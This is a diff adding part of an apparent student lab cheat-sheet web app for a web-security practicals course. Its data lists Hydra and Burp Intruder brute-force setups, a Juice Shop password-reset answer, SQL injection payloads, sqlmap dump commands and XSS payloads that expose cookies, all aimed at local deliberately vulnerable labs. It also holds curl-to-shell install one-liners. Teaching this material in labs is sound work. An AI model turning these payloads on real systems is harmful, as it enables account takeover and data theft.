+              "NVD (National Vulnerability Database): U.S. government repository of CVEs with CVSS severity scores, affected products, and mitigation steps (https://nvd.nist.gov/).",
+              "CVE (Common Vulnerabilities and Exposures): Unique identifier assigned to a specific vulnerability (e.g., CVE-2024-12345).",
+              "CWE (Common Weakness Enumeration): Classification of software flaw categories (e.g., CWE-79 = Cross-Site Scripting, CWE-89 = SQL Injection)."
+            ],
+            cmds: []
+          },
+          {
+            heading: "Step 1: Scan WordPress with WPScan",
+            desc: "Enumerate WordPress usernames (u), vulnerable plugins (vp), and vulnerable themes (vt):",
+            notes: [],
+            cmds: [
+              "wpscan --url http://<target-ip> --enumerate u,vp,vt"
+            ]
+          },
+          {
+            heading: "Step 2: Validate Discovered CVEs in NVD",
+            desc: "Search plugin and theme CVE IDs reported by WPScan in https://nvd.nist.gov/ and record CVSS severity scores and fix status.",
+            notes: [],
+            cmds: []
+          },
+          {
+            heading: "Step 3: Spider & Scan with OWASP ZAP",
+            desc: "Configure browser proxy to 127.0.0.1:8080 and crawl/scan the target:",
+            notes: [
+              "Traditional Spider: Fast; discovers links from static HTML responses.",
+              "AJAX Spider: Uses a real browser to render JavaScript-heavy applications.",
+              "Passive Scanning: Non-intrusive monitoring of HTTP traffic without modifying requests.",
+              "Active Scanning: Actively probes with attack payloads to find XSS, SQL Injection, missing security headers, and insecure cookies."
+            ],
+            cmds: ["zaproxy &"]
+          },
+          {
+            heading: "Step 4: Brute-Force WordPress Login with Hydra",
+            desc: "Deduplicate the wordlist (fsocity.dic) or use rockyou.txt to brute-force /wp-login.php:",
+            notes: [
+              "Syntax: hydra -l <user> -P <wordlist> <target-ip> http-post-form \"<path>:<POST-body>:F=<failure-string>\""
+            ],
+            cmds: [
+              "sort fsocity.dic | uniq > fsocity.dic.uniq",
+              "hydra -L /usr/share/wordlists/rockyou.txt -p blah <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'",
+              "hydra -l elliot -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid password'"
+            ]
+          }
+        ],
+        cmdsOnly: [
+          "wpscan --url http://<target-ip> --enumerate u,vp,vt",
+          "zaproxy &",
+          "sort fsocity.dic | uniq > fsocity.dic.uniq",
+          "hydra -L /usr/share/wordlists/rockyou.txt -p blah <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'",
+          "hydra -l elliot -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid password'"
+        ],
+        observations: [
+          "WPScan identified outdated plugins and valid WordPress usernames.",
+          "NVD confirmed CVSS severity scores for the discovered plugin CVEs.",
+          "OWASP ZAP flagged missing security headers and XSS vectors; Hydra cracked the login credentials."
+        ]
+      },
+      {
+        id: 6,
+        short: "Juice Shop (P5)",
+        title: "Exp 6 (Practical 5): Auth, Authorization & Identity Flaws in OWASP Juice Shop",
+        aim: "Evaluate authentication, authorization, account enumeration, default credentials, Burp Intruder brute-force, lockout, browser cache, and OSINT password reset flaws in OWASP Juice Shop.",
+        target: "http://127.0.0.1:42000",
+        tools: "OWASP Juice Shop, Burp Suite (Proxy & Intruder), Firefox",
+        steps: [
+          {
+            heading: "Environment Setup & Firefox Localhost Proxy Fix",
+            desc: "Launch Juice Shop and allow Firefox to route localhost (127.0.0.1) traffic through Burp Suite (127.0.0.1:8080):",
+            notes: [
+              "In Firefox address bar, open about:config and click Accept the Risk.",
+              "Search network.proxy.allow_hijacking_localhost and toggle it from false to true."
+            ],
+            cmds: [
+              "sudo apt update && sudo apt install -y juice-shop && sudo juice-shop",
+              "# Or via Docker on Ubuntu:\nsudo docker run --rm -d -p 42000:3000 --name juice-shop bkimminich/juice-shop",
+              "about:config -> network.proxy.allow_hijacking_localhost = true"
+            ]
+          },
+          {
+            heading: "Step 1 & 2: Role Definitions, Registration & Account Enumeration",
+            desc: "Test access controls, registration validation, and email leakage:",
+            notes: [
+              "Log in as a normal user and browse to /administration (confirm 403 Forbidden).",
+              "Test registration with invalid emails, short passwords, and special characters.",
+              "Inspect product reviews (e.g., Green Smoothie) to harvest exposed user emails (jim@juice-sh.op, admin@juice-sh.op)."
+            ],
+            cmds: []
+          },
+          {
+            heading: "Step 3: Default Credentials & Brute-Force with Burp Intruder",
+            desc: "Configure Burp Suite Intruder for Cluster Bomb (credential stuffing) & Sniper (password brute-force):",
+            notes: [
+              "Intercept a POST login request -> Right-click -> Send to Intruder -> Click Clear §.",
+              "Highlight username and password values and click Add § on each.",
+              "Set Attack Type to Cluster Bomb (tries every username + password combination).",
+              "IMPORTANT: In Payloads tab -> scroll to Payload Encoding -> uncheck/remove '.' (dot) so @juice-sh.op is not mangled.",
+              "Click Start Attack and look for HTTP 200 OK or 302 with a different response length (admin@juice-sh.op : admin123)."
+            ],
+            cmds: [
+              "username=§USERNAME§&password=§PASSWORD§",
+              "# Payload Set 1 (9 Usernames):\nadmin@juice-sh.op\nadministrator@juice-sh.op\nroot@juice-sh.op\nuser@juice-sh.op\ntest@juice-sh.op\nguest@juice-sh.op\nmanager@juice-sh.op\nsupport@juice-sh.op\nsecurity@juice-sh.op",
+              "# Payload Set 2 (6 Passwords):\nadmin\npassword\n123456\njuice\nwelcome\nadmin123"
+            ]
+          },
+          {
+            heading: "Step 4: Weak Lockout, Browser Cache & OSINT Password Reset",
+            desc: "Test post-authentication and account recovery controls:",
+            notes: [
+              "Weak Lockout: Attempt 10+ wrong passwords in a row -> verify no account lockout, delay, or CAPTCHA.",
+              "Browser Cache: Log in -> open Profile/Order History -> Log out -> press Browser Back button to check if sensitive pages remain cached.",
+              "Jim's Password Reset (OSINT): Jim's Green Smoothie review mentions 'replicator' (Star Trek -> Captain James T. Kirk). On Forgot Password for jim@juice-sh.op, answer 'Your eldest brother's middle name?' with Samuel (George Samuel Kirk)."
+            ],
+            cmds: [
+              "Email: jim@juice-sh.op\nSecurity Answer: Samuel"
+            ]
+          }
+        ],
+        cmdsOnly: [
+          "sudo apt update && sudo apt install -y juice-shop && sudo juice-shop",
+          "sudo docker run --rm -d -p 42000:3000 --name juice-shop bkimminich/juice-shop",
+          "about:config -> network.proxy.allow_hijacking_localhost = true",
+          "username=§USERNAME§&password=§PASSWORD§",
+          "admin@juice-sh.op\nadministrator@juice-sh.op\nroot@juice-sh.op\nuser@juice-sh.op\ntest@juice-sh.op\nguest@juice-sh.op\nmanager@juice-sh.op\nsupport@juice-sh.op\nsecurity@juice-sh.op",
+          "admin\npassword\n123456\njuice\nwelcome\nadmin123",
+          "jim@juice-sh.op -> Security Answer: Samuel"
+        ],
+        observations: [
+          "Burp Intruder Cluster Bomb identified valid credentials (admin@juice-sh.op : admin123) via HTTP 200 status and response length.",
+          "No account lockout triggered after 10+ failed login attempts.",
+          "OSINT from product reviews allowed resetting Jim's password using 'Samuel'."
+        ]
+      },
+      {
+        id: 7,
+        short: "DVWA SQLi (P6)",
+        title: "Exp 7 (Practical 6): SQL Injection & Blind SQL Injection in DVWA",
+        aim: "Demonstrate Classic SQL Injection (UNION-based) and Blind SQL Injection (Boolean-based & automated SQLMap) in DVWA set to Low Security.",
+        target: "http://localhost/DVWA (Login: admin / password, Security: Low)",
+        tools: "DVWA, SQLMap, Browser / Burp Suite",
+        steps: [
+          {
+            heading: "Step 1–4: Install DVWA & Set Security to Low",
+            desc: "Install DVWA via the official one-liner script (or Docker), log in with admin / password, click Create/Reset Database, and set DVWA Security to Low:",
+            notes: [
+              "Theory note: SQL evaluates AND before OR, so trailing '--' or '#' comments out 'AND password = ...' to make 'OR 1=1' always true."
+            ],
+            cmds: [
+              "sudo bash -c \"$(curl --fail --show-error --silent --location https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh)\"",
+              "# Or via Docker:\nsudo docker run --rm -d -p 80:80 --name dvwa vulnerables/web-dvwa"
+            ]
+          },
+          {
+            heading: "Part A (Steps 5–8): Classic SQL Injection (Visible Output)",
+            desc: "Open Vulnerabilities -> SQL Injection and enter these payloads in the User ID box:",
+            notes: [
+              "Step 5: Trigger SQL syntax error with 1'",
+              "Step 6: Bypass authentication and return all rows with 1' OR '1'='1",
+              "Step 7: Extract database version using UNION SELECT",
+              "Step 8: Enumerate tables and columns from information_schema, then dump users"
+            ],
+            cmds: [
+              "1'",
+              "1' AND 1=2 #",
+              "1' OR '1'='1",
+              "1' UNION SELECT null, version() #",
+              "1' UNION SELECT null, table_name FROM information_schema.tables #",
+              "1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' #",
+              "1' UNION SELECT user, password FROM users #"
+            ]
+          },
+          {
+            heading: "Part B (Steps 9–12): Manual Blind SQL Injection",
+            desc: "Open Vulnerabilities -> SQL Injection (Blind) and test boolean responses (User ID exists vs MISSING):",
+            notes: [
+              "Step 11: Compare True (1=1) vs False (1=2) behavior.",
+              "Step 12: Test if the 1st character of database() is 'd' (for 'dvwa')."
+            ],
+            cmds: [
+              "1'",
+              "1' AND 1=1 #",
+              "1' AND 1=2 #",
+              "1' AND SUBSTRING(database(),1,1)='d' #"
+            ]
+          },
+          {
+            heading: "Steps 13 & 14: Automated Blind SQLi with SQLMap",
+            desc: "Copy your PHPSESSID cookie from Burp Suite or Browser DevTools (F12 -> Storage -> Cookies) and run SQLMap:",
+            notes: [
+              "--dbs lists databases | -D dvwa --tables lists tables | -T users --dump extracts users and cracks MD5 hashes (admin:password, gordonb:abc123)."
+            ],
+            cmds: [
+              "sqlmap --url=\"http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#\" --cookie=\"PHPSESSID=YOUR_COOKIE; security=low\" --dbs --batch",
+              "sqlmap --url=\"http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#\" --cookie=\"PHPSESSID=YOUR_COOKIE; security=low\" -p id -D dvwa --tables --batch --threads 5",
+              "sqlmap --url=\"http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#\" --cookie=\"PHPSESSID=YOUR_COOKIE; security=low\" -D dvwa -T users --dump --batch --threads 5"
+            ]
+          }
+        ],
+        cmdsOnly: [
+          "1'",
+          "1' AND 1=2 #",
+          "1' OR '1'='1",
+          "1' UNION SELECT null, version() #",
+          "1' UNION SELECT null, table_name FROM information_schema.tables #",
+          "1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' #",
+          "1' UNION SELECT user, password FROM users #",
+          "1' AND 1=1 #\n1' AND 1=2 #\n1' AND SUBSTRING(database(),1,1)='d' #",
+          "sqlmap --url=\"http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#\" --cookie=\"PHPSESSID=YOUR_COOKIE; security=low\" --dbs --batch",
+          "sqlmap --url=\"http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#\" --cookie=\"PHPSESSID=YOUR_COOKIE; security=low\" -p id -D dvwa --tables --batch --threads 5",
+          "sqlmap --url=\"http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#\" --cookie=\"PHPSESSID=YOUR_COOKIE; security=low\" -D dvwa -T users --dump --batch --threads 5"
+        ],
+        observations: [
+          "Classic SQLi retrieved the MySQL/MariaDB version, table list, and users table records directly.",
+          "SQLMap automated Blind SQLi, identifying dvwa and information_schema and cracking MD5 password hashes (admin:password, gordonb:abc123)."
+        ]
+      },
+      {
+        id: 8,
+        short: "DVWA XSS (P7)",
+        title: "Exp 8 (Practical 7): Client-Side Testing (HTML Injection & XSS in DVWA)",
+        aim: "Demonstrate HTML Injection, JavaScript Execution, Cookie Theft, and Reflected, DOM-Based, and Stored XSS in DVWA (Low Security).",
+        target: "http://localhost/dvwa/ (Login: admin / password, Security: Low)",
+        tools: "DVWA, Web Browser (Firefox / Chrome)",
+        steps: [
+          {
+            heading: "Step 1 & 2: Setup DVWA & HTML Injection",
+            desc: "Set DVWA Security to Low -> Open Vulnerabilities -> XSS (Stored) -> enter raw HTML in the Message field and click Sign Guestbook:",
+            notes: [
+              "Alters visual page structure without executing JavaScript."
+            ],
+            cmds: [
+              "<h1>Website Defaced by Student</h1>"
+            ]
+          },
+          {
+            heading: "Step 3: JavaScript Execution & Cookie Theft",
+            desc: "In XSS (Stored), inject script payloads to execute JS and expose session cookies (if input length is capped, right-click -> Inspect -> increase maxlength):",
+            notes: [],
+            cmds: [
+              "<script>alert('JavaScript Executed!')<\/script>",
+              "<script>alert('Cookies: ' + document.cookie)<\/script>"
+            ]
+          },
+          {
+            heading: "Step 4: Reflected XSS (Non-Persistent)",
+            desc: "Navigate to Vulnerabilities -> XSS (Reflected), submit the payload, and click the rendered button:",
+            notes: [],
+            cmds: [
+              "<button onclick=\"alert('1')\">Click Me!</button>"
+            ]
+          },
+          {
+            heading: "Step 5: DOM-Based XSS",
+            desc: "Navigate to Vulnerabilities -> XSS (DOM), select a language, and modify the default= parameter directly in the URL bar:",
+            notes: [
+              "Executes directly in the browser DOM without server-side reflection."
+            ],
+            cmds: [
+              "http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')<\/script>"
+            ]
+          },
+          {
+            heading: "Step 6: Stored XSS (Compact Event Handler) & Filter-Bypass Payloads",
+            desc: "In XSS (Stored), submit a compact event handler payload (<div onmouseover=...>) and test alternative filter-bypass vectors:",
+            notes: [
+              "onmouseover: triggers when cursor hovers over element",
+              "onerror: triggers when image source fails to load",
+              "onfocus + autofocus: triggers immediately when input gains focus",
+              "onload: triggers when body/element finishes loading"
+            ],
+            cmds: [
+              "<div onmouseover=alert(1)>Hover</div>",
+              "<img src=x onmouseover=alert('XSS')>",
+              "<img src=invalidImage onerror=alert('XSS')>",
+              "<input autofocus onfocus=alert('XSS')>",
+              "<body onload=alert('XSS')>",
+              "<a href=\"javascript:alert('XSS')\">Click Me</a>",
+              "<iframe src=\"javascript:alert('Iframe XSS')\"></iframe>"
+            ]
+          }
+        ],
+        cmdsOnly: [
+          "<h1>Website Defaced by Student</h1>",
+          "<script>alert('JavaScript Executed!')<\/script>",
+          "<script>alert('Cookies: ' + document.cookie)<\/script>",
+          "<button onclick=\"alert('1')\">Click Me!</button>",
+          "http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')<\/script>",
+          "<div onmouseover=alert(1)>Hover</div>",
+          "<img src=x onmouseover=alert('XSS')>\n<img src=invalidImage onerror=alert('XSS')>\n<input autofocus onfocus=alert('XSS')>\n<body onload=alert('XSS')>\n<a href=\"javascript:alert('XSS')\">Click Me</a>\n<iframe src=\"javascript:alert('Iframe XSS')\"></iframe>"
+        ],
+        observations: [
+          "HTML Injection altered the guestbook layout visually.",
+          "JavaScript execution exposed PHPSESSID and security=low cookies via document.cookie.",
+          "Reflected, DOM-Based, and Stored XSS payloads executed inside the browser context."
+        ]
+      }
+    ];
+
+    const state = {
+      expId: Number(localStorage.getItem("s7_exp") || 1),
+      mode: localStorage.getItem("s7_mode") || "full",
+      scale: Number(localStorage.getItem("s7_scale") || 1),
+      theme: localStorage.getItem("s7_theme") || "dark",
+      searchQuery: "",
+      chatHistory: JSON.parse(localStorage.getItem("s7_chat") || "[]")
+    };
+
+    const originUrl = window.location.origin.startsWith("http")
+      ? window.location.origin
+      : "https://arxec-lab.vercel.app";
+
+    function escapeHtml(str) {
+      return String(str)
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;");
+    }
+
+    function applyPrefs() {
+      document.documentElement.setAttribute("data-theme", state.theme);
+      document.documentElement.style.setProperty("--user-scale", String(state.scale));
+      document.getElementById("themeLabel").textContent = state.theme === "dark" ? "Day" : "Night";
+      localStorage.setItem("s7_theme", state.theme);
+      localStorage.setItem("s7_scale", String(state.scale));
+      localStorage.setItem("s7_exp", String(state.expId));
+      localStorage.setItem("s7_mode", state.mode);
+    }
+
+    function renderExpStrip() {
+      const strip = document.getElementById("expStrip");
+      strip.innerHTML = EXPERIMENTS.map((e) => {
+        const active = (state.mode === "full" || state.mode === "cmds") && e.id === state.expId;
+        return `<button type="button" class="exp-pill" aria-pressed="${active}" data-exp="${e.id}">
+          <span class="num">#${e.id}</span><span>${escapeHtml(e.short)}</span>
+        </button>`;
+      }).join("");
+
+      strip.querySelectorAll(".exp-pill").forEach((btn) => {
+        btn.addEventListener("click", () => {
+          state.expId = Number(btn.getAttribute("data-exp"));
+          if (state.mode !== "full" && state.mode !== "cmds") state.mode = "full";
+          render();
+          window.scrollTo({ top: 0, behavior: "smooth" });
+        });
+      });
+    }
+
+    function renderModeTabs() {
+      document.querySelectorAll(".mode-btn").forEach((btn) => {
+        const m = btn.getAttribute("data-mode");
+        btn.setAttribute("aria-selected", String(m === state.mode));
+      });
+    }
+
+    function renderCmdBox(cmdText) {
+      const encoded = encodeURIComponent(cmdText);
+      const formatted = escapeHtml(cmdText)
+        .split("\n")
+        .map((line) => line.trim().startsWith("#") ? `<span class="comment">${line}</span>` : line)
+        .join("\n");
+      return `<div class="cmd-box">
+        <pre class="cmd-code">${formatted}</pre>
+        <button type="button" class="copy-btn" data-copy="${encoded}">Copy</button>
+      </div>`;
+    }
+
+    function bindCopyButtons(container) {
+      container.querySelectorAll(".copy-btn").forEach((btn) => {
+        btn.addEventListener("click", async () => {
+          const raw = decodeURIComponent(btn.getAttribute("data-copy") || "");
+          try {
+            await navigator.clipboard.writeText(raw);
+          } catch (_) {
+            const ta = document.createElement("textarea");
+            ta.value = raw;
+            document.body.appendChild(ta);
+            ta.select();
+            document.execCommand("copy");
+            ta.remove();
+          }
+          btn.setAttribute("data-copied", "true");
+          btn.textContent = "Copied";
+          setTimeout(() => {
+            btn.removeAttribute("data-copied");
+            btn.textContent = "Copy";
+          }, 1400);
+        });
+      });
+    }
+
+    function renderExperimentView() {
+      const exp = EXPERIMENTS.find((x) => x.id === state.expId) || EXPERIMENTS[0];
+      const prevId = exp.id > 1 ? exp.id - 1 : 8;
+      const nextId = exp.id < 8 ? exp.id + 1 : 1;
+      const prevExp = EXPERIMENTS.find((x) => x.id === prevId);
+      const nextExp = EXPERIMENTS.find((x) => x.id === nextId);
+
+      let bodyHtml = "";
+      if (state.mode === "cmds") {
+        bodyHtml = `<section class="step-block">
+          <h2 class="step-heading">Commands-Only Mode (./s7 c ${exp.id})</h2>
+          <p class="step-desc">Tap Copy on any block or switch to Full Guide for step-by-step explanations.</p>
+          <div class="cmd-group">
+            ${exp.cmdsOnly.map((c) => renderCmdBox(c)).join("")}
+          </div>
+        </section>`;
+      } else {
+        bodyHtml = `<div class="step-list">
+          ${exp.steps.map((st) => `
+            <section class="step-block">
+              <h2 class="step-heading">${escapeHtml(st.heading)}</h2>
+              ${st.desc ? `<p class="step-desc">${escapeHtml(st.desc)}</p>` : ""}
+              ${st.notes && st.notes.length ? `<ul class="step-notes">${st.notes.map((n) => `<li>${escapeHtml(n)}</li>`).join("")}</ul>` : ""}
+              ${st.cmds && st.cmds.length ? `<div class="cmd-group">${st.cmds.map((c) => renderCmdBox(c)).join("")}</div>` : ""}
+            </section>
+          `).join("")}
+        </div>
+        <aside class="obs-box">
+          <h2 class="obs-title">Observations &amp; Result</h2>
+          <ul class="step-notes">
+            ${exp.observations.map((o) => `<li>${escapeHtml(o)}</li>`).join("")}
+          </ul>
+        </aside>`;
+      }
+
+      return `
+        <article>
+          <header class="exp-header">
+            <h1 class="exp-title">${escapeHtml(exp.title)}</h1>
+            <div class="exp-meta">
+              <span><strong>Target:</strong> ${escapeHtml(exp.target)}</span>
+              <span><strong>Tools:</strong> ${escapeHtml(exp.tools)}</span>
+            </div>
+            <p class="exp-aim">${escapeHtml(exp.aim)}</p>
+          </header>
+          ${bodyHtml}
+          <nav class="pager-row" aria-label="Adjacent experiments">
+            <button type="button" class="pager-btn prev" data-goto="${prevId}">
+              <span>← Exp ${prevId}</span>
+              <span class="sub">${escapeHtml(prevExp.short)}</span>
+            </button>
+            <button type="button" class="pager-btn next" data-goto="${nextId}">
+              <span>Exp ${nextId} →</span>
+              <span class="sub">${escapeHtml(nextExp.short)}</span>
+            </button>
+          </nav>
+        </article>
+      `;
+    }
+
+    function renderSearchView() {
+      const q = state.searchQuery.trim().toLowerCase();
+      let resultsHtml = "";
+      if (q) {
+        const matches = EXPERIMENTS.filter((e) =>
+          JSON.stringify(e).toLowerCase().includes(q)
+        );
+        if (matches.length === 0) {
+          resultsHtml = `<p class="step-desc">No matches found for "${escapeHtml(state.searchQuery)}".</p>`;
+        } else {
+          resultsHtml = `<div class="step-list">${matches.map((m) => `
+            <section class="step-block">
+              <h2 class="step-heading">${escapeHtml(m.title)}</h2>
+              <p class="step-desc">${escapeHtml(m.aim)}</p>
+              <div class="cmd-group">${m.cmdsOnly.slice(0, 3).map((c) => renderCmdBox(c)).join("")}</div>
+              <div style="margin-top:0.65rem">
+                <button type="button" class="icon-btn open-exp-btn" data-open="${m.id}">Open Exp ${m.id} →</button>
+              </div>
+            </section>
+          `).join("")}</div>`;
+        }
+      } else {
+        resultsHtml = `<p class="step-desc">Search offline across all 8 experiments (e.g., hydra, sqlmap, Samuel, gobuster, dork, xss).</p>`;
+      }
+
+      return `
+        <section class="pane-box">
+          <h1 class="exp-title" style="margin-bottom:0.65rem">Offline Keyword Search (./s7 s)</h1>
+          <div class="input-row">
+            <input type="search" id="searchInput" class="term-input" value="${escapeHtml(state.searchQuery)}" placeholder="Search tool, flag, or payload..." />
+            <button type="button" id="searchBtn" class="action-btn">Find</button>
+          </div>
+          ${resultsHtml}
+        </section>
+      `;
+    }
+
+    function renderAiView() {
+      const msgs = state.chatHistory.length
+        ? state.chatHistory.map((m) => `<div class="chat-msg ${m.role === "user" ? "user" : "bot"}">${escapeHtml(m.role === "user" ? `you> ${m.content}` : m.content)}</div>`).join("")
+        : `<div class="chat-msg bot">AI Assistant ready (Lab RAG context for Exp 1–8 active). Ask any question about commands, flags, or viva theory.</div>`;
+
+      return `
+        <section class="pane-box">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:0.65rem;gap:0.5rem">
+            <h1 class="exp-title" style="margin-bottom:0">AI Lab Chat (./s7 ai)</h1>
+            <button type="button" id="clearChatBtn" class="icon-btn">Clear</button>
+          </div>
+          <div class="input-row">
+            <input type="text" id="aiInput" class="term-input" placeholder="Ask about Exp ${state.expId} or any command..." />
+            <button type="button" id="aiSendBtn" class="action-btn">Ask</button>
+          </div>
+          <div class="chat-log" id="chatLog">${msgs}</div>
+        </section>
+      `;
+    }
+
+    function renderCurlView() {
+      const cmds = [
+        `# 1. Ubuntu / Linux — Download & Run Interactive CLI:\ncurl -sL ${originUrl}/s7 -o s7 && chmod +x s7 && ./s7`,
+        `# 2. Quick Cheat Sheet in Terminal:\ncurl -sL ${originUrl}`,
+        `# 3. Direct Experiment Output without downloading:\ncurl -sL ${originUrl}/7`,
+        `# 4. Direct AI Question from Terminal:\ncurl -sL ${originUrl}/ask -d "give me the hydra command for exp 5"`,
+        `# 5. Windows PowerShell:\nirm ${originUrl}/s7.ps1 -OutFile s7.ps1; .\\s7.ps1`
+      ];
+      return `
+        <section class="pane-box">
+          <h1 class="exp-title" style="margin-bottom:0.5rem">Terminal &amp; Laptop One-Liners</h1>
+          <p class="step-desc">Copy these commands for your lab machine or share with friends:</p>
+          <div class="cmd-group">
+            ${cmds.map((c) => renderCmdBox(c)).join("")}
+          </div>
+        </section>
+      `;
+    }
+
+    async function askServerAi(question) {
+      const q = question.trim();
+      if (!q) return;
+      if (q.toLowerCase() === "clear" || q.toLowerCase() === "/clear") {
+        state.chatHistory = [];
+        localStorage.setItem("s7_chat", "[]");
+        render();
+        return;
+      }
+      state.chatHistory.push({ role: "user", content: q });
+      state.chatHistory.push({ role: "assistant", content: "Thinking..." });
+      render();
+
+      try {
+        const resp = await fetch(`${originUrl}/api/chat`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json", "X-Exp": String(state.expId) },
+          body: JSON.stringify({
+            prompt: q,
+            exp: state.expId,
+            history: state.chatHistory.slice(0, -1).slice(-8)
+          })
+        });
+        const data = await resp.json();
+        state.chatHistory[state.chatHistory.length - 1] = {
+          role: "assistant",
+          content: data.reply || data.error || "No response received."
+        };
+      } catch (err) {
+        state.chatHistory[state.chatHistory.length - 1] = {
+          role: "assistant",
+          content: "Offline or unreachable right now. All 8 experiments in Full Guide, Cmds Only, and Search still work 100% offline."
+        };
+      }
+      localStorage.setItem("s7_chat", JSON.stringify(state.chatHistory.slice(-16)));
+      render();
+    }
+
+    function render() {
+      applyPrefs();
+      renderExpStrip();
+      renderModeTabs();
+
+      const pathEl = document.getElementById("promptPath");
+      const bottomPrompt = document.getElementById("bottomPrompt");
+      if (state.mode === "full" || state.mode === "cmds") {
+        pathEl.textContent = `:~/exp${state.expId}${state.mode === "cmds" ? " (cmds)" : ""}`;
+        bottomPrompt.textContent = `s7 (${state.expId})>`;
+      } else {
+        pathEl.textContent = `:~/s7-${state.mode}`;
+        bottomPrompt.textContent = `s7 (${state.mode})>`;
+      }
+
+      const main = document.getElementById("mainViewport");
+      if (state.mode === "search") main.innerHTML = renderSearchView();
+      else if (state.mode === "ai") main.innerHTML = renderAiView();
+      else if (state.mode === "curl") main.innerHTML = renderCurlView();
+      else main.innerHTML = renderExperimentView();
+
+      bindCopyButtons(main);
+
+      main.querySelectorAll("[data-goto]").forEach((btn) => {
+        btn.addEventListener("click", () => {
+          state.expId = Number(btn.getAttribute("data-goto"));
+          render();
+          window.scrollTo({ top: 0, behavior: "smooth" });
+        });
+      });
+
+      main.querySelectorAll(".open-exp-btn").forEach((btn) => {
+        btn.addEventListener("click", () => {
+          state.expId = Number(btn.getAttribute("data-open"));
+          state.mode = "full";
+          render();
+          window.scrollTo({ top: 0, behavior: "smooth" });
+        });
+      });
+
+      const sInput = document.getElementById("searchInput");
+      const sBtn = document.getElementById("searchBtn");
+      if (sInput && sBtn) {
+        const triggerSearch = () => {
+          state.searchQuery = sInput.value;
+          render();
+        };
+        sBtn.addEventListener("click", triggerSearch);
+        sInput.addEventListener("keydown", (e) => {
+          if (e.key === "Enter") {
+            e.preventDefault();
+            triggerSearch();
+          }
+        });
+      }
+
+      const aiInput = document.getElementById("aiInput");
+      const aiSendBtn = document.getElementById("aiSendBtn");
+      const clearChatBtn = document.getElementById("clearChatBtn");
+      if (aiInput && aiSendBtn) {
+        aiSendBtn.addEventListener("click", () => askServerAi(aiInput.value));
+        aiInput.addEventListener("keydown", (e) => {
+          if (e.key === "Enter") {
+            e.preventDefault();
+            askServerAi(aiInput.value);
+          }
+        });
+      }
+      if (clearChatBtn) {
+        clearChatBtn.addEventListener("click", () => askServerAi("clear"));
+      }
+    }
+
+    document.querySelectorAll(".mode-btn").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        state.mode = btn.getAttribute("data-mode");
+        render();
+      });
+    });
+
+    document.getElementById("fontDownBtn").addEventListener("click", () => {
+      state.scale = Math.max(0.85, Number((state.scale - 0.1).toFixed(2)));
+      applyPrefs();
+    });
+
+    document.getElementById("fontUpBtn").addEventListener("click", () => {
+      state.scale = Math.min(1.45, Number((state.scale + 0.1).toFixed(2)));
+      applyPrefs();
+    });
+
+    document.getElementById("themeBtn").addEventListener("click", () => {
+      state.theme = state.theme === "dark" ? "light" : "dark";
+      applyPrefs();
+    });
+
+    document.getElementById("cmdForm").addEventListener("submit", (e) => {
+      e.preventDefault();
+      const input = document.getElementById("cmdInput");
+      const raw = input.value.trim();
+      input.value = "";
+      if (!raw) return;
+
+      const clean = raw.replace(/^\.?\/?s7\s*/i, "").trim();
+      const lower = clean.toLowerCase();
+
+      if (/^[1-8]$/.test(lower)) {
+        state.expId = Number(lower);
+        state.mode = "full";
+      } else if (/^p([1-7])$/.test(lower)) {
+        state.expId = Number(lower.slice(1)) + 1;
+        state.mode = "full";
+      } else if (/^c(?:\s+([1-8]))?$/.test(lower)) {
+        const m = lower.match(/^c(?:\s+([1-8]))?$/);
+        if (m[1]) state.expId = Number(m[1]);
+        state.mode = "cmds";
+      } else if (lower === "f" || lower === "full") {
+        state.mode = "full";
+      } else if (lower === "n" || lower === "next") {
+        state.expId = state.expId < 8 ? state.expId + 1 : 1;
+      } else if (lower === "p" || lower === "prev") {
+        state.expId = state.expId > 1 ? state.expId - 1 : 8;
+      } else if (lower.startsWith("s ")) {
+        state.searchQuery = clean.slice(2).trim();
+        state.mode = "search";
+      } else if (lower === "s" || lower === "search") {
+        state.mode = "search";
+      } else if (lower.startsWith("ai ") || lower.startsWith("a ")) {
+        const q = clean.replace(/^(ai|a)\s+/i, "");
+        state.mode = "ai";
+        render();
+        askServerAi(q);
+        return;
+      } else if (lower === "ai" || lower === "a") {
+        state.mode = "ai";
+      } else if (lower === "help" || lower === "h" || lower === "curl") {
+        state.mode = "curl";
+      } else {
+        state.mode = "ai";
+        render();
+        askServerAi(raw);
+        return;
+      }
+      render();
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    });
+
+    render();
+  </script>
+</body>
+</html>
